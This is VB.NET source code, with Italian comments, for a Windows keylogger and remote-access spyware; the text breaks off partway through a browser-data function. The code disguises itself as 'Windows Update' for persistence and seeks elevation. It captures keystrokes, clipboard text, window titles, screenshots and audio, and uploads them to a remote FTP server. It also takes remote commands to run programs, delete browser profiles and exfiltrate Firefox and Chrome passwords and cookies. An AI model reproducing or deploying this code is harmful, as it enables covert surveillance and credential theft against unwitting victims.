Imports System.IO
Imports System.Net
Imports System.Text.RegularExpressions
Imports System.Security.Principal
Imports System.Threading
Public Class Main

    Private WithEvents kbHook As New KeyboardHook
    Dim isShiftDown As Boolean   'Gestisce la pressione del tasto modificatore Shift
    Dim isCtrlDown As Boolean    'Gestisce la pressione del tasto modificatore Ctrl
    Dim isCapsEnabled As Boolean 'Gestisce la pressione del tasto modificatore CapsLock
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private Declare Function record Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLenght As Integer, ByVal hwndCallBack As Integer) As Integer
    Private makel As String


    Dim username As String = Environment.UserName 'Username
    Dim appdata As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) 'C:\Users\Username\AppData\Roaming
    Dim nomePcUtente As String '[Master-Username]
    Dim log As String 'CONTIENE IL LOG INTERO
    Dim inizioSessione As String 'DATA E ORA INIZIO SESSIONE
    Dim fineSessione As String 'DATA E ORA FINE SESSIONE
    Dim log_Name As String 'NOME CHE AVRA' IL FILE DI LOG IN BASE AL NOMEUTENTE E ALL'INIZIO SESSIONE
    Dim log_Path As String 'CARTELLA TEMPORANEA CHE CONTERRA' IL FILE DI LOG
    Dim log_URL As String 'URL DEL SERVER RIFERITO ALLA CARTELLA SPECIFICA
    Dim user_Path As String
    Dim mainURL As String = "ftp://<redacted>" 'URL DEL SERVER
    Dim OSName As String = My.Computer.Info.OSFullName
    Dim installedLang As String
    Dim currentLang As String
    Dim systemInfo As String
    Dim appunti As String

#Region "SOFTWARE"
    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Installazione()

        nomePcUtente = My.User.Name
        nomePcUtente = Replace(nomePcUtente, "\", "-") 'PC-UTENTE
        Dim time As String = GetTime("gmahms")
        inizioSessione = "[" & time & "]" '04/02/2016 16:48:51
        inizioSessione = Replace(inizioSessione, "/", "-")
        inizioSessione = Replace(inizioSessione, ":", "-")
        'iniziosessione = Replace(iniziosessione, " ", "_")
        user_Path = mainURL & nomePcUtente & "/"
        log_Name = inizioSessione
        log_URL = mainURL & nomePcUtente & "/LOG/" & log_Name & ".txt"
        log_Path = mainURL & nomePcUtente & "/LOG/"

        If My.Computer.Network.IsAvailable = True Then
            Try
                If FTP.ControllaCartella(mainURL, nomePcUtente) = 0 Then
                    FTP.CreaCartella(mainURL, nomePcUtente)
                    FTP.CreaCartella(mainURL & nomePcUtente, "/LOG")
                    FTP.CreaCartella(mainURL & nomePcUtente, "/FILE")
                    FTP.CreaCartella(mainURL & nomePcUtente, "/REC")
                    FTP.CreaCartella(mainURL & nomePcUtente, "/SCREEN")
                    FTP.CreaCartella(mainURL & nomePcUtente, "/SHELL")
                End If
            Catch ex As Exception
            End Try
        End If

        'EVENTUALE PRESENZA DI UN LOG GENERATO OFFLINE DA CARICARE
        If My.Computer.Network.IsAvailable = True Then
            Try
                Dim files() As String
                files = Directory.GetFiles(appdata, "*.txt")
                For Each FileName As String In files
                    If FileName.Contains("OFF") Then
                        Dim nome() As String = FileName.Split("\")
                        FTP.Upload(log_Path, nome(5), FileName, True)
                        Array.Clear(nome, 0, nome.Length)
                    End If
                Next
            Catch ex As Exception
            End Try
        End If

        log = ""
        log &= "####################################################" & vbNewLine
        log &= "#  @ " & nomePcUtente & " = " & inizioSessione & " @" & vbNewLine
        log &= "#" & vbNewLine
        log &= "#                      INFORMATION ABOUT:                      " & vbNewLine
        log &= GetSystemInfo()
        log &= "####################################################" & vbCrLf & vbCrLf

        GetHDDTree()

        AddHandler Microsoft.Win32.SystemEvents.PowerModeChanged, AddressOf PowerModeChanged
        'AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEnding

        Dim keyloggingThread As New Thread(AddressOf kbHook_KeyDown)
        Dim shellThread As New Thread(AddressOf GetShell)
        Dim logThread As New Thread(AddressOf InviaLog)

        shellThread.Start()
        keyloggingThread.Start()
        logThread.Start()
    End Sub
    Private Sub Installazione()

        '*** Windows Vista/7/8/8.1/10 ***

        Dim FileDirectory As String = "C:\Users\" & username & "\AppData\Roaming\Microsoft\winupdate.exe"
        Dim InstallDirectory As String = "C:\Users\" & username & "\AppData\Roaming\Microsoft\"
        Dim StartUpDirectory As String = "C:\Users\" & username & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        Dim StartUpLink As String = "C:\Users\" & username & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update.lnk"

        If Not My.Computer.Info.OSFullName.Contains("XP") Then          'DETERMINO IL SO INSTALLATO
            If Not File.Exists(FileDirectory) Then                      'VERIFICO SE ESISTE GIA' IL SW
                Dim priv As Boolean = checkPriv()                       'DISPONGO DEI PRIVILEGI DI AMMINISTRATORE?
                If priv = True Then                                     'SI, HO I PRIVILEGI DI AMMINISTRATORE
                    'INSTALLO IL SW
                    File.Copy(Application.ExecutablePath, FileDirectory)
                    Process.Start(FileDirectory)
                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Windows Update", FileDirectory)
                    End
                    'INSTALLA SERVIZIO 
                ElseIf priv = False Then                                'NO, NON HO I PRIVILEGIDI AMMINISTRATORE
                    Dim proc As New ProcessStartInfo
                    proc.UseShellExecute = True
                    proc.WorkingDirectory = Environment.CurrentDirectory
                    proc.FileName = Application.ExecutablePath
                    proc.Verb = "runas"
                    Try
                        Process.Start(proc)                             'PROVA AD ACQUISIRE I PRIVILEGI
                        End
                    Catch
                        File.Copy(Application.ExecutablePath, FileDirectory)
                        Process.Start(FileDirectory)
                        File.WriteAllText("C:\Users\" & username & "\AppData\Roaming\Microsoft\shortcut.vbs", My.Resources.shortcut)
                        Process.Start("C:\Users\" & username & "\AppData\Roaming\Microsoft\shortcut.vbs", "/collegamento:""C:\Users\" & username & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update.lnk"" /target:""C:\Users\" & username & "\AppData\Roaming\Microsoft\winupdate.exe""")
                        System.Threading.Thread.Sleep(1500)
                        File.Delete("C:\Users\" & username & "\AppData\Roaming\Microsoft\shortcut.vbs")
                        End
                    End Try
                End If
            End If
        End If

        '*** Windows XP ***

        Dim XPFileDirectory As String = "C:\WINDOWS\System32\winupdate.exe"
        Dim XPInstallDirectory As String = "C:\Windows\System32\"
        Dim XPRegKey As String = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"

        If My.Computer.Info.OSFullName.Contains("XP") Then               'DETERMINO IL SO INSTALLATO
            MsgBox("This software is incompatible with your system", MsgBoxStyle.Critical)
            End
            '   If Not File.Exists(XPFileDirectory) Then            'VERIFICO SE ESISTE GIA' IL SW
            '       File.Copy(Application.ExecutablePath, XPFileDirectory)
            '       Process.Start(XPFileDirectory)
            '       My.Computer.Registry.SetValue(XPRegKey, "Windows Update", XPFileDirectory)
            '        End
            '        'INSTALLA SERVIZIO 
            ' End If
        End If
    End Sub
    Private Function checkPriv()
            Dim identity = WindowsIdentity.GetCurrent()
            Dim principal = New WindowsPrincipal(identity)
            Dim isElevated As Boolean = principal.IsInRole(WindowsBuiltInRole.Administrator)
            Return isElevated
    End Function
    Private Sub InviaLog()
        Do
            GetScreen()
            Dim logdascrivere As String = log
            logdascrivere = Replace(logdascrivere, "[Program Manager]", "[Desktop]")
            If My.Computer.Network.IsAvailable = False Then
                Try
                    Dim offsw As StreamWriter
                    offsw = File.CreateText(appdata & "\" & inizioSessione & "-OFF" & ".txt")
                    offsw.Write(logdascrivere)
                    offsw.Flush()
                    offsw.Close()
                Catch ex As Exception
                End Try
            ElseIf My.Computer.Network.IsAvailable = True Then
                Try
                    Dim sw As StreamWriter
                    sw = File.CreateText(appdata & "\log.txt")
                    sw.Write(logdascrivere)
                    sw.Flush()
                    sw.Close()
                    FTP.Upload(log_URL, "", appdata & "\log.txt", True)
                Catch ex As Exception
                End Try
            End If

            logdascrivere = ""

            If My.Computer.Network.IsAvailable = True Then
                If File.Exists(appdata & "\tree.txt") Then
                    FTP.Upload(user_Path & "FILE/", "FILE - " & inizioSessione & ".txt", appdata & "\tree.txt", True)
                    File.Delete(appdata & "\vb.bat")
                End If

                If File.Exists(appdata & "\temp.png") Then
                    Dim time = GetTime("gmahms")
                    FTP.Upload(user_Path & "SCREEN/", "SCREEN - [" & time & "].png", appdata & "\temp.png", True)
                End If
            End If
            Thread.Sleep(300000)
        Loop
    End Sub
    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Dim logdascrivere As String = log
        fineSessione = Now()
        logdascrivere = logdascrivere + vbNewLine + "##### " & nomePcUtente & " = " & fineSessione & " #####"
        logdascrivere = Replace(logdascrivere, "[Program Manager]", "[Desktop]")
        If My.Computer.Network.IsAvailable = False Then
            Try
                Dim offsw As StreamWriter
                offsw = File.CreateText(appdata & "\" & inizioSessione & "-OFF" & ".txt")
                offsw.Write(logdascrivere)
                offsw.Flush()
                offsw.Close()
            Catch ex As Exception
            End Try
        ElseIf My.Computer.Network.IsAvailable = True Then
            Try
                Dim sw As StreamWriter
                sw = File.CreateText(appdata & "\log.txt")
                sw.Write(logdascrivere)
                sw.Flush()
                sw.Close()
                FTP.Upload(log_URL, "", appdata & "\log.txt", True)
            Catch ex As Exception
            End Try
        End If
        logdascrivere = ""
        fineSessione = ""
    End Sub

#End Region 'OK

#Region "KEYLOGGING"
    Private Sub kbHook_KeyDown(ByVal Key As System.Windows.Forms.Keys) Handles kbHook.KeyDown  'CATTURA I TASTI PREMUTI

        '=============== ALFABETO MINUSCOLO =============== (FALSE/FALSE)
        If isShiftDown = False And isCapsEnabled = False Then
            If Key = Keys.A Then
                log &= "a"
            ElseIf Key = Keys.B Then
                log &= "b"
            ElseIf Key = Keys.C Then
                log &= "c"
            ElseIf Key = Keys.D Then
                log &= "d"
            ElseIf Key = Keys.E Then
                log &= "e"
            ElseIf Key = Keys.F Then
                log &= "f"
            ElseIf Key = Keys.G Then
                log &= "g"
            ElseIf Key = Keys.H Then
                log &= "h"
            ElseIf Key = Keys.I Then
                log &= "i"
            ElseIf Key = Keys.J Then
                log &= "j"
            ElseIf Key = Keys.K Then
                log &= "k"
            ElseIf Key = Keys.L Then
                log &= "l"
            ElseIf Key = Keys.M Then
                log &= "m"
            ElseIf Key = Keys.N Then
                log &= "n"
            ElseIf Key = Keys.O Then
                log &= "o"
            ElseIf Key = Keys.P Then
                log &= "p"
            ElseIf Key = Keys.Q Then
                log &= "q"
            ElseIf Key = Keys.R Then
                log &= "r"
            ElseIf Key = Keys.S Then
                log &= "s"
            ElseIf Key = Keys.T Then
                log &= "t"
            ElseIf Key = Keys.U Then
                log &= "u"
            ElseIf Key = Keys.V Then
                log &= "v"
            ElseIf Key = Keys.W Then
                log &= "w"
            ElseIf Key = Keys.X Then
                log &= "x"
            ElseIf Key = Keys.Y Then
                log &= "y"
            ElseIf Key = Keys.Z Then
                log &= "z"
            End If
        End If

        '=============== ALFABETO MAIUSCOLO (TRUE/FALSE) ===============
        If isShiftDown = True And isCapsEnabled = False Then
            If Key = Keys.A Then
                log &= "A"
            ElseIf Key = Keys.B Then
                log &= "B"
            ElseIf Key = Keys.C Then
                log &= "C"
            ElseIf Key = Keys.D Then
                log &= "D"
            ElseIf Key = Keys.E Then
                log &= "E"
            ElseIf Key = Keys.F Then
                log &= "F"
            ElseIf Key = Keys.G Then
                log &= "G"
            ElseIf Key = Keys.H Then
                log &= "H"
            ElseIf Key = Keys.I Then
                log &= "I"
            ElseIf Key = Keys.J Then
                log &= "J"
            ElseIf Key = Keys.K Then
                log &= "K"
            ElseIf Key = Keys.L Then
                log &= "L"
            ElseIf Key = Keys.M Then
                log &= "M"
            ElseIf Key = Keys.N Then
                log &= "N"
            ElseIf Key = Keys.O Then
                log &= "O"
            ElseIf Key = Keys.P Then
                log &= "P"
            ElseIf Key = Keys.Q Then
                log &= "Q"
            ElseIf Key = Keys.R Then
                log &= "R"
            ElseIf Key = Keys.S Then
                log &= "S"
            ElseIf Key = Keys.T Then
                log &= "T"
            ElseIf Key = Keys.U Then
                log &= "U"
            ElseIf Key = Keys.V Then
                log &= "V"
            ElseIf Key = Keys.W Then
                log &= "W"
            ElseIf Key = Keys.X Then
                log &= "X"
            ElseIf Key = Keys.Y Then
                log &= "Y"
            ElseIf Key = Keys.Z Then
                log &= "Z"
            End If
        End If

        '=============== ALFABETO MAIUSCOLO (FALSE/TRUE) =============== 
        If isShiftDown = False And isCapsEnabled = True Then
            If Key = Keys.A Then
                log &= "A"
            ElseIf Key = Keys.B Then
                log &= "B"
            ElseIf Key = Keys.C Then
                log &= "C"
            ElseIf Key = Keys.D Then
                log &= "D"
            ElseIf Key = Keys.E Then
                log &= "E"
            ElseIf Key = Keys.F Then
                log &= "F"
            ElseIf Key = Keys.G Then
                log &= "G"
            ElseIf Key = Keys.H Then
                log &= "H"
            ElseIf Key = Keys.I Then
                log &= "I"
            ElseIf Key = Keys.J Then
                log &= "J"
            ElseIf Key = Keys.K Then
                log &= "K"
            ElseIf Key = Keys.L Then
                log &= "L"
            ElseIf Key = Keys.M Then
                log &= "M"
            ElseIf Key = Keys.N Then
                log &= "N"
            ElseIf Key = Keys.O Then
                log &= "O"
            ElseIf Key = Keys.P Then
                log &= "P"
            ElseIf Key = Keys.Q Then
                log &= "Q"
            ElseIf Key = Keys.R Then
                log &= "R"
            ElseIf Key = Keys.S Then
                log &= "S"
            ElseIf Key = Keys.T Then
                log &= "T"
            ElseIf Key = Keys.U Then
                log &= "U"
            ElseIf Key = Keys.V Then
                log &= "V"
            ElseIf Key = Keys.W Then
                log &= "W"
            ElseIf Key = Keys.X Then
                log &= "X"
            ElseIf Key = Keys.Y Then
                log &= "Y"
            ElseIf Key = Keys.Z Then
                log &= "Z"
            End If
        End If

        '=============== ALFABETO MINUSCOLO (TRUE/TRUE) ===============
        If isShiftDown = True And isCapsEnabled = True Then
            If Key = Keys.A Then
                log &= "a"
            ElseIf Key = Keys.B Then
                log &= "b"
            ElseIf Key = Keys.C Then
                log &= "c"
            ElseIf Key = Keys.D Then
                log &= "d"
            ElseIf Key = Keys.E Then
                log &= "e"
            ElseIf Key = Keys.F Then
                log &= "f"
            ElseIf Key = Keys.G Then
                log &= "g"
            ElseIf Key = Keys.H Then
                log &= "h"
            ElseIf Key = Keys.I Then
                log &= "i"
            ElseIf Key = Keys.J Then
                log &= "j"
            ElseIf Key = Keys.K Then
                log &= "k"
            ElseIf Key = Keys.L Then
                log &= "l"
            ElseIf Key = Keys.M Then
                log &= "m"
            ElseIf Key = Keys.N Then
                log &= "n"
            ElseIf Key = Keys.O Then
                log &= "o"
            ElseIf Key = Keys.P Then
                log &= "p"
            ElseIf Key = Keys.Q Then
                log &= "q"
            ElseIf Key = Keys.R Then
                log &= "r"
            ElseIf Key = Keys.S Then
                log &= "s"
            ElseIf Key = Keys.T Then
                log &= "t"
            ElseIf Key = Keys.U Then
                log &= "u"
            ElseIf Key = Keys.V Then
                log &= "v"
            ElseIf Key = Keys.W Then
                log &= "w"
            ElseIf Key = Keys.X Then
                log &= "x"
            ElseIf Key = Keys.Y Then
                log &= "y"
            ElseIf Key = Keys.Z Then
                log &= "z"
            End If
        End If

        '=============== NUMERI (RIGA TASTIERA) ===============
        If isShiftDown = False And isCtrlDown = False Then
            If Key = Keys.D0 Then
                log &= "0"
            ElseIf Key = Keys.D1 Then
                log &= "1"
            ElseIf Key = Keys.D2 Then
                log &= "2"
            ElseIf Key = Keys.D3 Then
                log &= "3"
            ElseIf Key = Keys.D4 Then
                log &= "4"
            ElseIf Key = Keys.D5 Then
                log &= "5"
            ElseIf Key = Keys.D6 Then
                log &= "6"
            ElseIf Key = Keys.D7 Then
                log &= "7"
            ElseIf Key = Keys.D8 Then
                log &= "8"
            ElseIf Key = Keys.D9 Then
                log &= "9"
            End If
        End If

        '=============== NUMERI (NUM PAD) ===============
        If isShiftDown = False And isCtrlDown = False Then
            If Key = Keys.NumPad0 Then
                log &= "0"
            ElseIf Key = Keys.NumPad1 Then
                log &= "1"
            ElseIf Key = Keys.NumPad2 Then
                log &= "2"
            ElseIf Key = Keys.NumPad3 Then
                log &= "3"
            ElseIf Key = Keys.NumPad4 Then
                log &= "4"
            ElseIf Key = Keys.NumPad5 Then
                log &= "5"
            ElseIf Key = Keys.NumPad6 Then
                log &= "6"
            ElseIf Key = Keys.NumPad7 Then
                log &= "7"
            ElseIf Key = Keys.NumPad8 Then
                log &= "8"
            ElseIf Key = Keys.NumPad9 Then
                log &= "9"
            End If
        End If

        '=============== SIMBOLI ===============

        '==================== SHIFT = FALSE ====================
        If isShiftDown = False And isCtrlDown = False Then
            If Key = Keys.OemPipe Then
                log &= "\"
            ElseIf Key = Keys.OemQuestion Then '--------QUESTO VIENE IDENTIFICATO COME ù QUINDI è DA VERIFICARE SU ALTRI COMPUTER
                log &= "'"
            ElseIf Key = Keys.OemPeriod Then
                log &= "."
            ElseIf Key = Keys.Oemcomma Then
                log &= ","
            ElseIf Key = Keys.OemMinus Then
                log &= "-"
            ElseIf Key = Keys.Oemplus Then
                log &= "+"
            ElseIf Key = Keys.Divide Then
                log &= "/"
            ElseIf Key = Keys.Multiply Then
                log &= "*"
            ElseIf Key = Keys.Subtract Then
                log &= "-"
            End If
        End If

        '==================== SHIFT = TRUE ====================
        If isShiftDown = True And isCtrlDown = False Then
            If Key = Keys.D0 Then
                log &= "="
            ElseIf Key = Keys.D1 Then
                log &= "!"
            ElseIf Key = Keys.D2 Then
                log &= """"
            ElseIf Key = Keys.D3 Then
                log &= "£"
            ElseIf Key = Keys.D4 Then
                log &= "$"
            ElseIf Key = Keys.D5 Then
                log &= "%"
            ElseIf Key = Keys.D6 Then
                log &= "&"
            ElseIf Key = Keys.D7 Then
                log &= "/"
            ElseIf Key = Keys.D8 Then
                log &= "("
            ElseIf Key = Keys.D9 Then
                log &= ")"
            ElseIf Key = Keys.OemPipe Then
                log &= "|"
            ElseIf Key = Keys.OemQuestion Then '--------QUESTO VIENE IDENTIFICATO COME ù QUINDI è DA VERIFICARE SU ALTRI COMPUTER
                log &= "?"
            ElseIf Key = Keys.Oemcomma Then
                log &= ";"
            ElseIf Key = Keys.OemPeriod Then
                log &= ":"
            ElseIf Key = Keys.OemMinus Then
                log &= "_"
            End If
            'Non funziona l'accento circonflesso
        End If

        '=============== TASTI FUNZIONE ===============
        If isShiftDown = False And isCtrlDown = False Then
            If Key = Keys.F1 Then
                log &= "<F1>"
            ElseIf Key = Keys.F2 Then
                log &= "<F2>"
            ElseIf Key = Keys.F3 Then
                log &= "<F3>"
            ElseIf Key = Keys.F4 Then
                log &= "<F4>"
            ElseIf Key = Keys.F5 Then
                log &= "<F5>"
            ElseIf Key = Keys.F6 Then
                log &= "<F6>"
            ElseIf Key = Keys.F7 Then
                log &= "<F7>"
            ElseIf Key = Keys.F8 Then
                log &= "<F8>"
            ElseIf Key = Keys.F9 Then
                log &= "<F9>"
            ElseIf Key = Keys.F10 Then
                log &= "<F10>"
            ElseIf Key = Keys.F11 Then
                log &= "<F11>"
            ElseIf Key = Keys.F12 Then
                log &= "<F12>"
            ElseIf Key = Keys.F13 Then
                log &= "<F13>"
            End If
        End If

        '=============== TASTI SPECIALI ===============
        If Key = Keys.Escape Then
            log &= "<Esc>"
        ElseIf Key = Keys.Home Then
            log &= "<Home>"
        ElseIf Key = Keys.Delete Then
            log &= "<Canc>"
        ElseIf Key = Keys.End Then
            log &= "<Fine>"
        ElseIf Key = Keys.PageUp Then
            log &= "<PagSu>"
        ElseIf Key = Keys.PageDown Then
            log &= "<PagGiu>"
        ElseIf Key = Keys.Tab Then
            log &= "<Tab>"
        ElseIf Key = Keys.LWin Then
            log &= "<Win>"
        ElseIf Key = Keys.Enter Then
            log &= "<Invio>"
        ElseIf Key = Keys.Return Then
            log &= "<Invio>"
        ElseIf Key = Keys.Space Then
            log &= " "
        ElseIf Key = Keys.Back Then
            log = log.Remove(log.Length - 1)
        End If
    End Sub
    Private Sub GetModifierKeys_Tick(sender As Object, e As EventArgs) Handles GetModifierKeys.Tick
        isShiftDown = ((Control.ModifierKeys And Keys.Shift) = Keys.Shift)
        isCtrlDown = ((Control.ModifierKeys And Keys.Control) = Keys.Control)
        isCapsEnabled = Control.IsKeyLocked(Keys.CapsLock)
    End Sub
    Private Function GetCaption() As String
        Dim Caption As New System.Text.StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function
    Private Sub GetWindowTitle_Tick(sender As Object, e As EventArgs) Handles GetWindowTitle.Tick
        Dim CapTxt As String = GetCaption()
        If makel <> CapTxt And CapTxt <> Nothing Then
            makel = CapTxt
            GetWindowTitle.Stop()
            Dim time As String = GetTime("hms")
            log &= vbCrLf & "[" & time & "]" & "[" & CapTxt & "]" & " --> "
            GetWindowTitle.Start()
        End If
    End Sub
    Private Sub GetClipboard_Tick(sender As Object, e As EventArgs) Handles GetClipboard.Tick
        If My.Computer.Clipboard.ContainsText() Then

            If appunti <> My.Computer.Clipboard.GetText Then
                Dim trimappunti As String = My.Computer.Clipboard.GetText
                trimappunti = Replace(trimappunti, vbCrLf, " \n ")
                Dim time = GetTime("hms")
                log &= vbCrLf + "[" & time & "] #Clipboard --> [" + trimappunti + "]" + vbCrLf
                appunti = My.Computer.Clipboard.GetText
                trimappunti = ""
                time = ""
            End If

        End If
    End Sub
    Private Function GetSystemInfo()
        If My.Computer.Network.IsAvailable = True Then
            Try
                Dim wbc As WebClient = New WebClient
                Dim IPExt As String = wbc.DownloadString("https://wtfismyip.com/text") 'Scarica la pagina con i dati
                IPExt = IPExt.Replace(vbLf, "")
                Dim IPInt As String = Dns.GetHostByName(Dns.GetHostName).AddressList(0).ToString()
                GetKeyboardLang()
                systemInfo = "# IP Address: " & IPExt & " / " & IPInt & vbNewLine & "# OS: " & OSName & vbNewLine & "# Lingue Installate: " & installedLang & vbNewLine & "# Lingua corrente: " & currentLang & vbNewLine
                Return systemInfo
            Catch ex As Exception
            End Try
        End If
    End Function
    Private Sub GetKeyboardLang()
        Try
            For index = 0 To InputLanguage.InstalledInputLanguages.Count - 1 Step 1
                installedLang &= InputLanguage.InstalledInputLanguages.Item(index).LayoutName.ToString & ", "
            Next
            currentLang = InputLanguage.CurrentInputLanguage.LayoutName.ToString()
        Catch ex As Exception
        End Try
    End Sub

#End Region 'OK

#Region "FUNZIONI LOCALI"
    Private Function GetTime(ByVal arg As String)
        Dim sec As String = Now.Second
        If sec.Length = 1 Then sec = "0" & sec

        Dim min As String = Now.Minute
        If min.Length = 1 Then min = "0" & min

        Dim hour As String = Now.Hour
        If hour.Length = 1 Then hour = "0" & hour

        Dim day As String = Now.Day
        If day.Length = 1 Then day = "0" & day

        Dim month As String = Now.Month
        If month.Length = 1 Then month = "0" & month

        If arg = "gmahms" Then
            Dim gmahms As String = day & "-" & month & "-" & Now.Year & " " & hour & ":" & min & ":" & sec
            Return gmahms
        ElseIf arg = "gma" Then
            Dim gma As String = day & "-" & month & "-" & Now.Year
            Return gma
        ElseIf arg = "hms" Then
            Dim hms As String = hour & ":" & min & ":" & sec
            Return hms
        End If
    End Function
    Private Sub Uninstall()
        Try
            My.Computer.FileSystem.DeleteFile(appdata & "\log.txt")
            My.Computer.FileSystem.DeleteFile(Application.ExecutablePath)
            File.WriteAllText(Application.StartupPath & "\unistall.bat", My.Resources.unistall)
            Process.Start(Application.StartupPath & "\unistall.bat")
        Catch ex As Exception
        End Try
    End Sub
    Private Sub EliminaCookies()
        Try
            '=== Firefox
            My.Computer.FileSystem.DeleteDirectory("C:\Users\" + username + "\AppData\Roaming\Mozilla\Firefox\Profiles", FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently)
            File.Delete("C:\Users\" + username + "\AppData\Roaming\Mozilla\Firefox\profiles.ini")
            '=== Chrome
            My.Computer.FileSystem.DeleteDirectory("C:\Users\" + username + "\AppData\Local\Google\Chrome\User Data", FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently)
            '=== IE
            My.Computer.FileSystem.DeleteDirectory("C:\Users\" + username + "\AppData\Roaming\Microsoft\Windows\Cookies", FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently)
            '=== Opera
            My.Computer.FileSystem.DeleteDirectory("C:\Users\" + username + "\AppData\Roaming\Opera\Opera", FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently)
        Catch ex As Exception
        End Try
    End Sub
    Private Function GetScreen() As Bitmap
        Dim dimensioneSchermo As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Dim Immagine As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Dim Cattura As Graphics = Graphics.FromImage(Immagine)
        Cattura.CopyFromScreen(New Point(0, 0), New Point(0, 0), dimensioneSchermo)
        Immagine.Save(appdata & "\temp.png", System.Drawing.Imaging.ImageFormat.Png)
        Return Immagine
    End Function
    Private Sub GetHDDTree()
        Try
            File.WriteAllText("C:\Users\" & username & "\AppData\Roaming\vb.bat", "tree C:\Users /F /A > C:\Users\" & username & "\AppData\Roaming\tree.txt")
            Dim pi As New ProcessStartInfo()
            pi.FileName = "C:\Users\" & username & "\AppData\Roaming\vb.bat"
            pi.WindowStyle = ProcessWindowStyle.Hidden
            Process.Start(pi)
        Catch ex As Exception
        End Try
    End Sub
    Private Sub recAudioStart()
        Try
            record("open new Type waveaudio Alias recsound", "", 0, 0)
            record("set recsound bitspersample 16", "", 0, 0)
            record("set recsound samplespersec 44100", "", 0, 0)
            record("set recsound channels 2", "", 0, 0)
            record("record recsound", "", 0, 0)
            '11025=low quality
            '22050=medium quality
            '44100=high quality
        Catch ex As Exception
        End Try
    End Sub
    Private Sub recAudioSSU()
        Try
            record("stop recsound", "", 0, 0)
            record("save recsound C:\Users\" & username & "\AppData\Roaming\temp.wav", "", 0, 0)
            record("close recsound", "", 0, 0)
            If My.Computer.Network.IsAvailable = True Then
                Dim time As String = GetTime("gmahms")
                FTP.Upload(user_Path, "REC/REC-" & time, "C:\Users\" & username & "\AppData\Roaming\temp.wav", True)
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub ExecuteShell(ByVal comando As String, Optional ByVal arg As String = "", Optional ByVal arg2 As String = "", Optional ByVal arg3 As String = "")

        '√ DOWNLOAD       --> Scarica il file scelto nella directory file del server
        '√ UPLOAD         --> Carica il file dal server al pc
        '√ START          --> Esegue il file selezionato (VISIBILE SI/NO)
        '√ SHUTDOWN       --> Spegne il pc
        '√ RESTART        --> Riavvia il pc
        '√ MSGBOX         --> Visualizza un msgbox personalizzato
        '√ DELETECOOKIE   --> Elimina i cookie dal pc
        '√ GETBROWSERDATA --> Cattura la cronologia e la carica sul server
        '√ GETSCREEN      --> Screenna e carica
        '√ WEB XXX        --> Apre una pagina web
        '√ UNINSTALL      --> Disinstalla il keylogger
        '√ REC|START      --> Inizia la regsitrazione audio
        '√ REC|STOP       --> Stoppa e uploada la registrazione audio
        '√ MSGBOX         --> Mostra una finestra di messaggio con testo personalizzato
        '√ UPDATE         --> Aggiorna il client
        If comando = "UPLOAD" Then
            Try
                FTP.Upload(user_Path & "FILE/", arg2, arg & arg2, False)
            Catch ex As Exception
            End Try
        End If

        If comando = "DOWNLOAD" Then
            Try
                FTP.Download(arg, arg2, arg3)
            Catch ex As Exception
            End Try
        End If

        If comando = "START" Then
            Try
                If arg2 = 1 Then
                    Process.Start(arg)
                ElseIf arg2 = 2 Then
                    Dim processo As New ProcessStartInfo()
                    processo.FileName = arg
                    processo.WindowStyle = ProcessWindowStyle.Hidden
                    Process.Start(processo)
                End If
            Catch ex As Exception
            End Try
        End If

        If comando = "SHUTDOWN" Then
            Try
                Shell("shutdown /s /t " & arg)
            Catch ex As Exception
            End Try
        End If

        If comando = "RESTART" Then
            Try
                Shell("shutdown /r /t " & arg)
            Catch ex As Exception
            End Try
        End If

        If comando = "DELETECOOKIE" Then
            EliminaCookies()
        End If

        If comando = "GETBROWSERDATA" Then
            Try
                If Directory.Exists(appdata & "/Mozilla") = True Then
                    FTP.CreaCartella(user_Path & "FILE/", "FIREFOX")
                    Dim fire As String = appdata & "/Mozilla/Firefox/Profiles/"
                    Dim dir() = Directory.GetDirectories(fire)
                    For i = 0 To dir.Length
                        FTP.Upload(user_Path & "FILE/FIREFOX/", "places.sqlite", fire & dir(i) & "/places.sqlite", False) ' nel file places.sqlite sono contenuti tutti i segnalibri di Firefox, l'elenco dei file scaricati e l'elenco dei siti web visitati
                        FTP.Upload(user_Path & "FILE/FIREFOX/", "key3.db", fire & dir(i) & "/key3.db", False) 'password
                        FTP.Upload(user_Path & "FILE/FIREFOX/", "logins.json", fire & dir(i) & "/logins.json", False) 'password
                        FTP.Upload(user_Path & "FILE/FIREFOX/", "cookies.sqlite", fire & dir(i) & "/cookies.sqlite", False) 'cookie
                    Next
                End If

                If Directory.Exists("C:\Users\" & username & "\AppData\Local\Google\Chrome\User Data") = True Then
                    Dim chrome As String = "C:\Users\" & username & "\AppData\Local\Google\Chrome\User Data\Default\"
                    FTP.CreaCartella(user_Path & "FILE/", "CHROME")
